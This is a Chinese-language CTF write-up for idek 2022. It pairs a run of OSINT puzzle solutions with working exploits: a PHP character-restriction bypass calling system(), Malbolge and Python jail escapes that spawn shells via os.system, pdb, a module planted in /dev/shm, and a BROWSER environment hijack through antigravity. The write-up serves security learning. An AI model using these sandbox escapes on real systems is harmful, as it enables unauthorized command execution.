# idek 2022* MISC && OSINT && BlockChain Writeup

## 前言 

本比赛的Misc,OSINT,Blockchain题目都比较有趣,且本文会比较注重pyjail和OSINT部分,其中在比赛过程中AK了OSINT,Blockchain和MISC各差一题(都比较接近,有些可惜),当然本writeup中将其全部展示.欢迎大家交互,互相学习进步.喜欢玩国际赛的小伙伴欢迎简历`root@r3kapig.com`加入我们一起玩,我们会及时和你联系

![](https://i.imgur.com/Q8OZ5q7.png)

## Misc:

### PHPFu...n:

题目限制了只能有以下几个字符

```
([.^])',
```

基本思路就是用现有的字符造更多的字符，但是因为只要一报错就会 `die()` ，所以不能用包括 `[].''` 在内的很多方式，只能从现有的开始：

```
In [206]: mapping = {}
     ...: for a, b in combinations('[(,.^)]', 2):
     ...:     x = chr(ord(a) ^ ord(b))
     ...:     if x in mapping:
     ...:         continue
     ...:     mapping[x] = (a, b)
     ...:

In [207]: mapping
Out[207]:
{'s': ('[', '('),
 'w': ('[', ','),
 'u': ('[', '.'),
 '\x05': ('[', '^'),
 'r': ('[', ')'),
 '\x06': ('[', ']'),
 '\x04': ('(', ','),
 'v': ('(', '^'),
 '\x01': ('(', ')'),
 '\x02': (',', '.'),
 'q': (',', ']'),
 'p': ('.', '^'),
 '\x07': ('.', ')'),
 '\x03': ('^', ']'),
 't': (')', ']')}
 ```
所以现在就有了 `([.^])',swurvqpt`然后看到有 `str` 就想看看有什么能用的字符串相关的函数（https://www.php.net/manual/zh/ref.strings.php）：

```
In [209]: str_funcs = ['addcslashes','addslashes','bin2hex','chop','chr','chunk_​split','convert_​uudecode','convert_​ne
     ...: code','count_​chars','crc32','crypt','echo','explode','fprintf','get_​html_​translation_​table','hebrev','heni
     ...: ','html_​entity_​decode','htmlentities','htmlspecialchars_​decode','htmlspecialchars','implode','join','lcfi't
     ...: ,'levenshtein','localeconv','ltrim','md5_​file','md5','metaphone','money_​format','nl_​langinfo','nl2br','nure
     ...: _​format','ord','parse_​str','print','printf','quoted_​printable_​decode','quoted_​printable_​encode','quote',
     ...: rtrim','setlocale','sha1_​file','sha1','similar_​text','soundex','sprintf','sscanf','str_​contains','str_​eniw
     ...: th','str_​getcsv','str_​ireplace','str_​pad','str_​repeat','str_​replace','str_​rot13','str_​shuffle','str_​s'
     ...: tr_​starts_​with','str_​word_​count','strcasecmp','strchr','strcmp','strcoll','strcspn','strip_​tags','striphs
     ...: es','stripos','stripslashes','stristr','strlen','strnatcasecmp','strnatcmp','strncasecmp','strncmp','strpbrk'
     ...: ,'strpos','strrchr','strrev','strripos','strrpos','strspn','strstr','strtok','strtolower','strtoupper','strtr
     ...: ','substr_​compare','substr_​count','substr_​replace','substr','trim','ucfirst','ucwords','utf8_​decode','utne
     ...: code','vfprintf','vprintf','vsprintf','wordwrap']

In [210]: for func in str_funcs:
     ...:     if all(c in mapping for c in func):
     ...:         print(func)
     ...:
strstr
strtr
```

然后通过 `strstr` 就可以拿到 `false = strstr('.',',')`，但是还不够，于是就跑去把所有的函数都拿来了（https://www.php.net/manual/zh/indexes.functions.php）：

```
In [211]: phpfuncs = []
     ...: with open("/phpfuncs.txt",'r', encoding='utf8') as f:
     ...:     phpfuncs = f.read().split(',')
     ...:

In [212]: for func in phpfuncs:
     ...:     if all(c in mapping for c in func):
     ...:         print(func)
     ...:
sqrt
strstr
strtr
```

然后通过 `sqrt(strstr('.',','))` 拿到了 `0` ，但是拿到数字之后现在并没有什么用，于是想办法放到之前已经有的字符里面看看还能生成什么字符：

```
In [215]: mapping = {}
     ...: for a, b in combinations('[(,.^)]0', 2):
     ...:     x = chr(ord(a) ^ ord(b))
     ...:     if x in mapping:
     ...:         continue
     ...:     mapping[x] = (a, b)
     ...: mapping
Out[215]:
{'s': ('[', '('),
 'w': ('[', ','),
 'u': ('[', '.'),
 '\x05': ('[', '^'),
 'r': ('[', ')'),
 '\x06': ('[', ']'),
 'k': ('[', '0'),
 '\x04': ('(', ','),
 'v': ('(', '^'),
 '\x01': ('(', ')'),
 '\x18': ('(', '0'),
 '\x02': (',', '.'),
 'q': (',', ']'),
 '\x1c': (',', '0'),
 'p': ('.', '^'),
 '\x07': ('.', ')'),
 '\x1e': ('.', '0'),
 '\x03': ('^', ']'),
 'n': ('^', '0'),
 't': (')', ']'),
 '\x19': (')', '0'),
 'm': (']', '0')}
 In [216]: for func in phpfuncs:
     ...:     if all(c in mapping for c in func):
     ...:         print(func)
     ...:
sqrt
strspn
strstr
strtr
```

多了一个 `strspn` 那么现在就有任意数字了，接下来就想办法构造 `chr` 函数：

```
'c': ('[', '8')
'h': ('[', '3')
'r': ('[', ')')
```

`chr` 出了就可以开始写 exp 了：

```python
from pwn import *

s      = "('['^'(')"
str    = f"{s}.(')'^']').('['^')')"
strstr = f"{str}.{str}"
sqrt   = f"{s}.(','^']').('['^')').(')'^']')"
zero   = f"({sqrt})(({strstr})('.',',')).''"
strspn = f"{str}.{s}.('.'^'^').('^'^{zero})"
num    = lambda x:f"({strspn})('{'.' * x}','.')"
phpchr = lambda x:f"(('['^{num(8)}.'').('['^{num(3)}.'').('['^')'))({num(ord(x))})"
phpstr = lambda str:'.'.join([phpchr(c) for c in str])

payload = f"({phpstr('system')})({phpstr('cat /flag.txt')})"
print(payload)

r = remote('phpfun.chal.idek.team', 1337)
r.recvuntil(b'Input script: ')
r.sendline(payload.encode())
r.interactive()
```

### Manager Of The Year I:

此题和AI毫无关系，训练数据和x全都是多余的
如果第一个数是y，可以第一次全猜0，第二次第一个数是1，其他是0，这样就从MSE可以得到y^2-(y-1)^2=2y-1，从而可以知道y。猜366次就能知道每个数

```python
from pwn import *
import re
conn=remote("manager-of-the-year-1.chal.idek.team",1337)
conn.sendline()
conn.recvuntil(") for 2023:")
conn.sendline(" ".join(["0"]*365))
u=conn.recvuntil(") for 2023:")
u=(float(re.findall(b"\((.*?)\)",u)[0])**2)*365
z=[]
for i in range(365):
    print(i)
    conn.sendline(" ".join(["1" if j==i else "0" for j in range(365)]))
    v=conn.recvuntil(") for 2023:")
    v=(float(re.findall(b"\((.*?)\)",v)[0])**2)*365
    z.append((u-v+1)/2)
conn.sendline(" ".join([str(i) for i in z]))
conn.interactive()
```

### Manager Of The Year 2:

此题和AI也毫无关系，本质上是一个高维优化题目，对365个变量的每个进行一次golden-section search，就能把MSE降低到要求

```python
from pwn import *
import re
conn=remote("manager-of-the-year-2.chal.idek.team",1337)
conn.sendline()
print(conn.recvuntil(") for 2023:"))
def guess(v):
    conn.sendline(" ".join([str(i) for i in v]))
    u=conn.recvuntil(") for 2023:", timeout=1)
    return b'neural' in u

import math
gr=(math.sqrt(5)-1)/2
v=[100*gr*gr]*365
guess(v)
for i in range(365):
    l=0
    ll=100*gr*gr
    rr=100*gr
    r=100
    guesscnt=0
    while (guesscnt<18) or (guesscnt==18 and rr-ll>0.1187):
        oldv=v[:]
        v[i]=rr
        guesscnt=guesscnt+1
        if guess(v):
            guesscnt=guesscnt+1
            v=oldv[:]
            t=guess(v)
            r=rr
            rr=ll
            ll=gr*l+gr*gr*r
            l,ll,rr,r=r,rr,ll,l
        else:
            l=ll
            ll=rr
            rr=gr*r+gr*gr*l
    print(i)

conn.sendline(" ".join([str(i) for i in v]))
conn.interactive()
```

### Malbolge I: Gluttony
构造一个类似 echo 的 opcode

```
op*/</</</</</</</</</</</</</</</</</</</</</</</</</</</</<
```

转换为Malbolge标准形式

```
D=%r_p]n[lYjWhUfSdQbO`M^K\IZGXEVCTAR?P=N;L9J7H5F3D1B/@->+<):'
```

然后就可以任意输入要执行的代码了，比如

```python
__import__("os").system("sh")
```

### Malbolge II: Greed

这次不能用stdin了，同时还把crazy操作的函数改为每次随机的映射表。用这里的生成器https://github.com/wallstop/MalbolgeGenerator，同样修改crazyOperation函数，再尝试生成即可。注意到有一些crazy表比较容易生成，所以需要多尝试交互几次。

比较短的代码应该更容易生成，因此使用

```
eval(input())
```

当时成功的数据如下

```
crazy = [[2, 1, 1], [0, 1, 0], [2, 0, 2]] 
DCB$@?!=65498x054-,1q).-m%*j"!~}$#"!~`|{tsxqYonmrqSRhmledcKaf_d]b[ZYAWV>T<;W9U7ML4POHMLKDhHG
FE>b%A:">~<;43W1w/u-2+*)on&l$ji!g%|dzya`|utyxqvunVUkpinglNdibg`_dc\a`B^@VU=SRWVUNSRQ32H0LEJC
g*@EDC<;:"!~<;:98xUv43,1qpo',+k)"!&%e{"!a`v{z\[wYonVrTjohPfkMLba`HGc\DZBX@?U=SRQ9UTSR4PIHGFE
DCB*F?'&%;:"8~6;{z270/43srqp(nm%k#"'&}e{cbx`|{tyrqYutmUkpohmONjLhJI_^FE[`_AWV[T<R:P87M5Q3OHM
FEi,BAe?cC%$#?>7<5{3yxw/432r0p(n&+*#('gf|{"ya`|{]sxqYuWsrTjohgOkdcKJ`edc\[C_XW?UT<X:P8TMRKoI
1M/KJ,+GF(DC%$:"8=<;{3WxU5.-s+*)(-&l$j"'&}e{zyxwv^tyrqpuWVUkSRhPfkMLbaIeGF\DC_A@VUZSR:9ONSL4
3ON0LK-C+*@(>&BA@9!7<|43y7w5.32+*).-,+*j(h&%$dzbaw_{]srZvoWsrkjohgfkjcba`eG]ba`YA]\>=SX:VU7S
RKPIH0FKJC+*F?>=<A@"8=<;{X8VC 
```

### Malbolge III: Wrath

同样用生成器https://github.com/wallstop/MalbolgeGenerator，修改 findString 函数的 count 阈值，可以搜到更短的Malbolge代码，我改到了 10 

依然用

```python
eval(input())
```

搜到了这个

```
'C<;:?87[;:3216543,P*/.-,+*#"!E%${zy~w=^ts[wpunVrTji/PledLbJIHG]\aZBAW?UT<X:VUTSLKJ2HMLK-CgA
@?D&%;:9!=6;43W70/S-,+0)M-&+$H"!&%|#z!~wv{tyxqYoWmlkpihmle+iba'e%p
```

### Malbolge3 Revenge:

这次不能用eval了，考虑直接使用os.system

```
__import__('os').system('sh')
```

由于题目用了exec，可以执行多条代码，所以可以用这个更短的

```
import os;os.system("sh")
```

通过搜索发现了一个比较高效的生成器http://zb3.me/malbolge-tools/#generator，用它的第二个模式生成，Max branches between progress设成7就可以找到满足长度要求的结果

```
(&B;_#87[}43Wy0/Su,+Oq('KmkHih~Df{z@>a_N;:xqY6WWVk1/{g,kd*Lt`H%cF!D_B|z>yf+dctr7_p]O2lkE.hfG)db=<A$^\J}5|XV70v.3QP0qLKJI[H(!Ef|{z@b`v<^\9Zputm3Uji/QOe+MKg`&^cFaZ~AW{?><w;99sq
```

### Niki:

这道题是一个类似 Scratch 的东西，用附件里面的程序打开 `german_scrambled.pas` 就可以加载题目程序了：

![](https://i.imgur.com/jsXpftq.png)

尝试运行之后发现这个程序有很多都是向下走的指令，但是默认那个机器人在左下角，再往下就会报错，而且初始的 Material（就相当于颜料数量）为0，画不了图案，所以点击左上角的格子按钮调整一下：

![](https://i.imgur.com/OqRDlL9.png)

然后就会发现机器人会画很多东西出来，比较乱，而且后面还是会到边界报错，于是尝试一个函数一个函数跑：

![](https://i.imgur.com/0DtMwaA.png)

![](https://i.imgur.com/82zfHal.png)

可以看到 `h;` 打出了一个大写的 P，然后挨个把文件里面的函数都运行一遍就有了下面的：

```
h -> P
o -> S
brackl -> (
a -> O
v -> E
u -> I
brackr -> )
q -> D
p -> K
l -> T
```

`PS(OEI)DKT` idek前缀都在，似乎就是 flag 了，简单处理一下得到 `idek{stop}`

### Pyjail:

代码是这样的

```python
blocklist = ['.', '\\', '[', ']', '{', '}',':']
DISABLE_FUNCTIONS = ["getattr", "eval", "exec", "breakpoint", "lambda", "help"]
DISABLE_FUNCTIONS = {func: None for func in DISABLE_FUNCTIONS}
```

有个blocklist ban掉了`'.', '\\', '[', ']', '{', '}',':'`.然后有个`DISABLE_FUNCTIONS` 注册了关于`"getattr", "eval", "exec", "breakpoint", "lambda", "help"`的None对象并且覆盖其`__builtins__`中的函数对应函数.同时文件名是`jail.py`,docker里的也是jail起来的所以可以用,`__import__('jail')`但是可能要输入两次,所以不如使用`__import__(__main__)`

同时flag设置权限了不能直接读 然后给了一个`readflag`,调用参数是`/readflag giveflag`即可

同时本题可以多行执行,所以可以搞一些例如清空blocklist的操作 如下

```
welcome!
>>> setattr(__import__('__main__'),'blocklist','')
None
>>> __import__('os').system('sh')
sh: 0: can't access tty; job control turned off
$ ls
jail.py  readflag.c
$ ls /
bin   ctf  etc   home  lib    media  opt   readflag  run   srv  tmp  var
boot  dev  flag  kctf  lib64  mnt    proc  root      sbin  sys  usr
$ /readflag giveflag
idek{9eece9b4de9380bc3a41777a8884c185}
```

当然还有第二个版本用`__import__('jail')`来进行加载,但是似乎得打两次 因为第一个导入了jail 等于重启了一次新的环境

```
welcome!
>>> setattr(__import__('jail'),'blocklist','')
welcome!
>>> setattr(__import__('jail'),'blocklist','')
None
>>> __import__('os').system('sh')
sh: 0: can't access tty; job control turned off
$ /readflag giveflag
idek{9eece9b4de9380bc3a41777a8884c185}
```

### Pyjail Revenge:

比赛中没做出 赛后复现

Revenge版本的区别和正常版本的区别在于 blocklist 添加了`blocklist`,`globals`以及`compile`

```
blocklist = ['.', '\\', '[', ']', '{', '}',':', "blocklist", "globals", "compile"]
```

同时只能一行输入,不能多次输入所以之前的办法目前是行不通.不过还有以下版本可以尝试

#### 方法1 删除覆盖:

DISABLE_FUNCTIONS 注册了关于`"getattr", "eval", "exec", "breakpoint", "lambda", "help"`的None对象并且覆盖其`__builtins__`中的函数对应函数,所以只要删除掉覆盖的全局变量就行

那全局变量可以通过`globals()`,`vars()`,`locals()`等 当然也可以通过unicode的形式绕过`blocklist` 比如`gloｂals`类似的形式,这样就可以删掉`DISABLE_FUNCTIONS`里的函数然后将其调用.

例如先用`setattr`将一些没用类的`__dict__`覆盖以`globals()`,`vars()`,`locals()`然后再通过`delattr`删掉那些`DISABLE_FUNCTIONS`,再进行调用

比如以下:

vars(),locals(）都可以用

覆盖copyright 调用breakpoint函数

```
welcome!
>>> setattr(copyright,'__dict__',gloｂals()),delattr(copyright,'breakpoint'),breakpoint()
--Return--
> <string>(1)<module>()->(None, None, None)
(Pdb) import os;os.system('sh')
sh: 0: can't access tty; job control turned off
$ /readflag giveflag
idek{what_used_to_be_a_joke_has_now_turned_into_an_pyjail_escape.How_wonderful!}

welcome!
>>> setattr(copyright,'__dict__',vars()),delattr(copyright,'breakpoint'),breakpoint()
--Return--
> <string>(1)<module>()->(None, None, None)
(Pdb) import os;os.system('sh')
sh: 0: can't access tty; job control turned off
$ /readflag giveflag
idek{what_used_to_be_a_joke_has_now_turned_into_an_pyjail_escape.How_wonderful!}

welcome!
>>> setattr(copyright,'__dict__',locals()),delattr(copyright,'breakpoint'),breakpoint()
--Return--
> <string>(1)<module>()->(None, None, None)
(Pdb) import os;os.system('sh')
sh: 0: can't access tty; job control turned off
$ /readflag giveflag
idek{what_used_to_be_a_joke_has_now_turned_into_an_pyjail_escape.How_wonderful!}
```

覆盖license 调用breakpoint函数

```
welcome!
>>> setattr(license,'__dict__',gloｂals()),delattr(license,'breakpoint'),breakpoint()
--Return--
> <string>(1)<module>()->(None, None, None)
(Pdb) import os;os.system('sh')
sh: 0: can't access tty; job control turned off
$ /readflag giveflag
idek{what_used_to_be_a_joke_has_now_turned_into_an_pyjail_escape.How_wonderful!}

welcome!
>>> setattr(license,'__dict__',vars()),delattr(license,'breakpoint'),breakpoint()
--Return--
> <string>(1)<module>()->(None, None, None)
(Pdb) import os;os.system('sh')
sh: 0: can't access tty; job control turned off
$ /readflag giveflag
idek{what_used_to_be_a_joke_has_now_turned_into_an_pyjail_escape.How_wonderful!}

welcome!
>>> setattr(license,'__dict__',locals()),delattr(license,'breakpoint'),breakpoint()
--Return--
> <string>(1)<module>()->(None, None, None)
(Pdb) import os;os.system('sh')
sh: 0: can't access tty; job control turned off
$ /readflag giveflag
idek{what_used_to_be_a_joke_has_now_turned_into_an_pyjail_escape.How_wonderful!}
```

相关覆盖的参数可以找这些https://github.com/python/cpython/blob/c5660ae96f2ab5732c68c301ce9a63009f432d93/Lib/site.py#L400-L426

```
quit,copyright,exit,license,credits
```

当然由于这个版本他是这样的启动参数

```dockerfile
ENTRYPOINT socat \
    TCP-LISTEN:1337,reuseaddr,fork,end-close \
    EXEC:"./jail.py",pty,ctty,stderr,raw,echo=0
```

所以也可以删help() 然后利用help()再rce 但是远程环境可能有些限制导致/tmp 无了可能/tmp不可写只读 但是本地可以工作

```
welcome!
>>> setattr(license,'__dict__',locals()),delattr(license,'help'),help()

Welcome to Python 3.8's help utility!

If this is your first time using Python, you should definitely check out
the tutorial on the Internet at https://docs.python.org/3.8/tutorial/.

Enter the name of any module, keyword, or topic to get help on writing
Python programs and using Python modules.  To quit this help utility and
return to the interpreter, just type "quit".

To get a list of available modules, keywords, symbols, or topics, type
"modules", "keywords", "symbols", or "topics".  Each module also comes
with a one-line summary of what it does; to list the modules whose name
or summary contain a given string such as "spam", type "modules spam".

help> os
[Errno 2] No usable temporary directory found in ['/tmp', '/var/tmp', '/usr/tmp', '/home/user']
```

#### 方法2 修改sys.path,写文件后再import:

其由以下几个部分组成

1. 通过`setattr`覆盖`sys.path`的属性,覆盖为可写的`/dev/shm`
2. 然后通过`print`函数的`file`参数 `https://blog.csdn.net/no_giveup/article/details/72017925`,然后用open来打开并且去写,`.`用`chr(46)`代替和拼接.
3. 使用`__import__`加载写入的文件名,然后执行代码

其分别为
1. `setattr(__import__("sys"), "path", list(("/dev/shm/",)))`
2. `print("import os" + chr(10) + "print(os" + chr(46) + "system('/readflag giveflag'))", file=open("/dev/shm/exp" + chr(46) + "py", "w"))`
3. `__import__("exp")`

组合成payload:

```python
(setattr(__import__("sys"), "path", list(("/dev/shm/",))), print("import os" + chr(10) + "print(os" + chr(46) + "system('/readflag giveflag'))", file=open("/dev/shm/exp" + chr(46) + "py", "w")), __import__("exp"))
```

结果:

```
welcome!
>>> (setattr(__import__("sys"), "path", list(("/dev/shm/",))), print("import os" + chr(10) + "print(os" + chr(46) + "system('/readflag giveflag'))", file=open("/dev/shm/exp" + chr(46) + "py", "w")), __import__("exp"))
idek{what_used_to_be_a_joke_has_now_turned_into_an_pyjail_escape.How_wonderful!}
0
(None, None, <module 'lol' from '/dev/shm/exp.py'>)
```

当然应该是环境问题导致的情况,其远程环境的`/tmp`是只读的,但是其实应该可写.其上述路径如果在`tmp`可写的话也可以完成相关的payload.

#### 方法3 antigravity劫持BROWSER环境变量:

并且`antigravity`可以从这里看出https://towardsdatascience.com/7-easter-eggs-in-python-7765dc15a203

本解法来自于作者的预期解,本题很有意思.利用`setattr`覆盖到`os.environ`中的环境变量`BROWSER` 从而可以执行.跟踪一下
https://github.com/python/cpython/blob/main/Lib/antigravity.py

```python
import webbrowser
import hashlib

webbrowser.open("https://xkcd.com/353/")

def geohash(latitude, longitude, datedow):
    '''Compute geohash() using the Munroe algorithm.
    >>> geohash(37.421542, -122.085589, b'2005-05-26-10458.68')
    37.857713 -122.544543
    '''
    # https://xkcd.com/426/
    h = hashlib.md5(datedow, usedforsecurity=False).hexdigest()
    p, q = [('%f' % float.fromhex('0.' + x)) for x in (h[:16], h[16:32])]
    print('%d%s %d%s' % (latitude, p[1:], longitude, q[1:]))
```

发现其调用了`webbrowser`,继续跟踪一下
可以从这里看到open函数里存在`register_standard_browsers` https://github.com/python/cpython/blob/main/Lib/webbrowser.py#L84

```python
def open(url, new=0, autoraise=True):
    """Display url using the default browser.
    If possible, open url in a location determined by new.
    - 0: the same browser window (the default).
    - 1: a new browser window.
    - 2: a new browser page ("tab").
    If possible, autoraise raises the window (the default) or not.
    """
    if _tryorder is None:
        with _lock:
            if _tryorder is None:
                register_standard_browsers()
    for name in _tryorder:
        browser = get(name)
        if browser.open(url, new, autoraise):
            return True
    return False
```

继续跟踪`register_standard_browsers`可以发现其检查了`os.environ`中的`BROWSER`环境变量
https://github.com/python/cpython/blob/main/Lib/webbrowser.py#L585

```python
    if "BROWSER" in os.environ:
        userchoices = os.environ["BROWSER"].split(os.pathsep)
        userchoices.reverse()

        # Treat choices in same way as if passed into get() but do register
        # and prepend to _tryorder
        for cmdline in userchoices:
            if cmdline != '':
                cmd = _synthesize(cmdline, preferred=True)
                if cmd[1] is None:
                    register(cmdline, None, GenericBrowser(cmdline), preferred=True)
```

其中`GenericBrowser`可以运行cmdline https://github.com/python/cpython/blob/main/Lib/webbrowser.py#L181

```python
class GenericBrowser(BaseBrowser):
    """Class for all browsers started with a command
       and without remote functionality."""

    def __init__(self, name):
        if isinstance(name, str):
            self.name = name
            self.args = ["%s"]
        else:
            # name should be a list with arguments
            self.name = name[0]
            self.args = name[1:]
        self.basename = os.path.basename(self.name)

    def open(self, url, new=0, autoraise=True):
        sys.audit("webbrowser.open", url)
        cmdline = [self.name] + [arg.replace("%s", url)
                                 for arg in self.args]
        try:
            if sys.platform[:3] == 'win':
                p = subprocess.Popen(cmdline)
            else:
                p = subprocess.Popen(cmdline, close_fds=True)
            return not p.wait()
        except OSError:
            return False
```

最后exp:

```python
__import__('antigravity',setattr(__import__('os'),'environ',dict(BROWSER='/bin/sh -c "/readflag giveflag" #%s')))
```

#### 方法4 通过恢复sys.modules,让__import__加载getattr生效:

由于`__import__`在加载的时候会先找`sys.modules`-->`https://github.com/python/cpython/blob/48ec678287a3be1539823fa3fc0ef457ece7e1c6/Lib/importlib/_bootstrap.py#L1101`,所以可以先通过`setattr`覆盖`sys.modules`为`__builtins__`,这样`__import__`即可调用`getattr`.通过`getattr`可以来加载`os.system`.由于`.`被ban了所以可以用`__import__('os'),'system'`.然后传参`'sh'`即可

```python
setattr(__import__('sys'),'modules',__builtins__) or __import__('getattr')(__import__('os'),'system')('sh')
```

## OSINT:

### Osint Crime Confusion 1: W as in Where

```
Someone has died unexpectedly. The police is on it, but between you and me, I cannot wait for the police. I am a private investigator and I need your help. Unfortunately, we might be tracked so I cannot give you the information directly. Start in a major social network. Certainly not a problem for the best hacker I know right...? Alright here goes a beautiful poem:

Some people in weird ways were connected
Some were a triangle, some were less directed
For one night they all met
At doctor's Jonathan Abigdail the third they wept 
Things were said, threats in the air
A few days later someone is dead
Who is that someone? That is for you to find,
Also who is the killer, if you really don't mind.

Note for the all the challenges: The challenge is divided into three challenges: Where, Weapon, and Who. Where is the first one the others will come later. In each one you can find the flag somwhere online. You might find the information in any order, however the expected order is: Where, Weapon and Who. Example: If the answer is knife then when you would discover that somewhere: like "the killer used a idek{knife_V5478G}" or instructions on how to get the flag: like "idek{weaponUsed_V5478G}}". The flag would then be idek{knife_V5478G}.
```

本题在线索提示中写道`At doctor's Jonathan Abigdail the third they wept` 其关键词是`Jonathan Abigdail`找到一个ins

https://www.instagram.com/abigdail3djohn/

![](https://i.imgur.com/olZqGoN.png)

ins推文:

```
The EYE
Now imagin you could INK IT!
That is right, at the famous convention for the eye yours truly is presenting!
Hopefully reunited with a lot of old friends to see it!
The hashtag is #TheEye12tothe3isthekeytoBEyousee?
Get HYPEEEED
```

然后点击`#TheEye12tothe3isthekeytoBEyousee`
可以找到https://www.instagram.com/hjthepainteng/ 账户 
之后我们可以看到了一件关键的推文

```
I do not know what happened, only 3 days after that stupid eye convention you appear dead. Only if there was someone that could find what happened. I only hope you know that you died somewhere after the best performance ever at the great_paintball_portugal competition. I write this still there, arranging for moving your body back home. Farewell. I love you. Also they said they would sell something on ebay for you <3
```

其中可以看到一些关键字`great_paintball_portugal`以及`ebay`的提示

可以通过https://whatsmyname.app/

得到链接 https://www.ebay.com/usr/great_paintball_portugal

```
About
So after the death we actually decided instead of selling just to make a little rip post at https: franparrefrancisco.wixsite.com/great-paintball-pt. We do not want the blog post to be very obvious though because of the publicity.
Location: PortugalMember since: May 12, 2022
```

https://franparrefrancisco.wixsite.com/great-paintball-pt

由于是一个`blog`形式可以fuzzing尝试一些参数,比如`/post`然后即可看到

https://franparrefrancisco.wixsite.com/great-paintball-pt/post

![](https://imgur.com/9j4cWMx.png)

点`See More Posts`,可以看到
https://franparrefrancisco.wixsite.com/great-paintball-pt/blog

![](https://imgur.com/4Hcjydy.png)

点击https://franparrefrancisco.wixsite.com/great-paintball-pt/post/great-paintball-portugal-death-heather-james

![](https://imgur.com/lDazL6l.png)

可以拿到第一部分flag

```
Death at the Great Paintball Portugal of Heather James
Yes, we are sad to confirm that yesterday one athlete by the name Heather James was killed. Authorities are investigating as we speak as are YOU, the reader, I hope.
We confirm that it was indeed here at idek{TGPP_WCIYD}.
```

可以拿到flag --> `idek{TGPP_WCIYD}`

### Osint Crime Confusion 2: W as in Weapon

```
Now that you found where, can you help me find what was the weapon of the crime? It has something to do with a university of science.
Note: Previous links or accounts might be usefull.
```

通过https://www.instagram.com/hjthepainteng/ 的info可以拿到这些信息

```
Heather James
Mechanical Engineer
Love Paintball
Study and Teached blue birds at the University of Dutch ThE of Topics in Science (UThE_TS)
```

`blue brids`可能是推特 然后可以搜到相关的账户 `@UThE_TS`--> https://twitter.com/UThE_TS

```
https://twitter.com/UThE_TS/status/1610041133463371776
The new dutch university for all science topics has arrived! Stay tuned!

https://twitter.com/UThE_TS/status/1610041337671290880
First order of business: Will release a link for a review of our brightest students from past years as well as the BIGGEST scandals! You will not want to miss it!

https://twitter.com/UThE_TS/status/1611392544008732672
It has been released great!
```

可以拿到删除的推文https://web.archive.org/details/https://twitter.com/UThE_TS/status/1612383535549059076,并且可以得知`potatoes eating camels`是凶手

```
https://web.archive.org/web/20230109094239/https://twitter.com/UThE_TS/status/1612383535549059076
Remember that weird student that wrote about potatoes eating camels? AHAHAH Maybe she is the killer
```

查看列表

![](https://imgur.com/GyRMoEf.png)

![](https://imgur.com/gLMRp4I.png)

![](https://imgur.com/RrqdJP3.png)

```
The List Test
Look in the german chaos pad: /ep/pad/view/ro.lvGC01KAJWI/rev.354
```

Google chaospad 然后第一个就是
https://pads.ccc.de/ep/pad/view/ro.lvGoC01KAJWI/rev.354/

右上角播放

```
Now, in ThE University there have been so many great and admirable students.
 
There was the great philosopher IfyouSun YouTzu that did a great thing for octopus rights in the netherlands.
 
Also the great mathematician Isthat Newtoyou that discovered pravity the opposed forced to gravity.
 
No one was here Of course if you find who was, remember that tthe   4 initials of the object plus  "_X!#$" is the key ( idek{4CapitalLetters_X!#$}.
 
Also, there was the great astronomer Carl Segway, who discovered Earth again!
```

然后翻历史版本可以翻到

```
One great one was Heather James the great student and teacher who has recently deceased sadly :( but that is ok-
We do have a theory to what killed because something has been missing (
HUBBLE SPACE TELESCOPE MODEL, BY PENWAL INDUSTRIES FOR NASA, CA 1990) ah shit delete delete
 but maybe I should not have said it here. Let me delete it. Done. Great that these days these things are easy to clean up.
```

凶器是`HUBBLE SPACE TELESCOPE MODEL`,取四个大写字母

最后可以得到flag --> `idek{HSTM_X!#$}`

### Osint Crime Confusion 3: W as in Who

```
I feel the killer might be dangerous so I have some info to give you but I don't want to disclose my email just like that. So find my review from the image below and send me an email asking for info. Be creative with the signature so I know its you. It is time to find Who is the killer.
```

通过附件给的图片 可以得到

https://www.alfaiatedinteriores.pt/site/pt/lojas-fabrica/

Av. do Brasil 363 4150-376 Porto, Portugal

可以看到

```
O melhor alfaite da zona! Rende a vinda! Tinha me pedido o email para mais informações! Aqui vai: noodlesareramhackers at gmail dot com
```

通过gmail可以搜到github

https://github.com/potatoes-eating-camels/potatoes-eating-camels/wiki

此外也验证了2中提到的信息`potatoes eating camels`是凶手

项目里的README.md写着

```
Hi there 👋
👋 Hi, I’m @potatoes-eating-camels
👀 I’m interested in Kill.. I mean giving love to the wooooorld!
🌱 I’m currently learning about weapons
💞️ I’m looking to collaborate on not being found by the police.
👀 I'm still improving wiki.
-.-- --- ..-
.-. . .- .-.. .-.. -.--
-.. ---
- .... .. -. -.-
..
.-- --- ..- .-.. -..
--. .. ...- .
```

morse解完是无用信息 然后可以注意wiki部分 访问https://github.com/potatoes-eating-camels/potatoes-eating-camels/wiki

可以看到

```
This is all you need to know about me! But all is hidden so the police can never find me eheheh.
However, I do not want to hide forever! I truly believe that we should all be friends.
Essentially, I am one with the love and nature!
Now, let's focus on talking about me! I
am extremely fan of potatoes obvious!
Must I say I love camels as well?
Evidently, the image of a potato that eats a camel is legendary.
In retrospect this page is not the best idea.
Surely, nothing will come of it eheh.
Just read this beautiful poem (Yes I am a poet!):
Under cover of night
Like a shadow on the move
Invisible to sight
A stealthy escape I prove
Never leaving a trace
Aware of every sound
Note: The flag is idek{NameOfTheKillerCapitalLetters_APOSIDM723489} where you must put the name of the killer at the start in capital letters
```

很明显这个I有换行可能是藏头诗
`THE NaME IS JULIANA`
最后得到flag --> `idek{JULIANA_APOSIDM723489}`

### OSINT Crime Confusion 4: W as in Why

```
You did it! You found the killer!!! But whyy oh why did she do it?
Apparently she was obsessed with stamps, but was it real or not?
Well, I found this image on her computer, maybe it can help you.
Also a nice poem:
""" 
A man of peace, a collector too
His name, Johan Jørgen, forever true
A network vast, across the land
His passion, stamps, with Olympic brand

A stamp of Seoul, in '88
Issued to commemorate, the games we all love
A rare find, this stamp of Olympic dream
But where, oh where, can it be seen?
A man of peace, his legacy lives on
In stamps and memories, forever strong
But where to find, this elusive prize
A mystery yet, to the collector's eyes.
""" 
The flag is idek{STAMP_IDENTIFIER}, ex: idek{OLX-42069}
Note: This challenge does not need any information from the previous challenges
```

题目里面的`Johan Jørgen` 以及提到了邮票 Google可以搜到 翻一翻

![](https://imgur.com/Wra2xh7.png)

https://digitaltmuseum.no/021027988861/frimerke

![](https://imgur.com/soy8Gzk.png)

flag可以拿到 --> `idek{OLM-08741}`

### NMPZ:

```
Are you as good as Rainbolt at GeoGuessr? Prove your skills by geo-guessing these 17 countries.

Figure out in which country each image was taken.
The first letter of every country's name will create the flag.
Countries with over 10 million inhabitants will have a capital letter.
Countries with less than one million inhabitants become an underscore.

Example:
idek{TEST_flAg}
1.png: Turkey
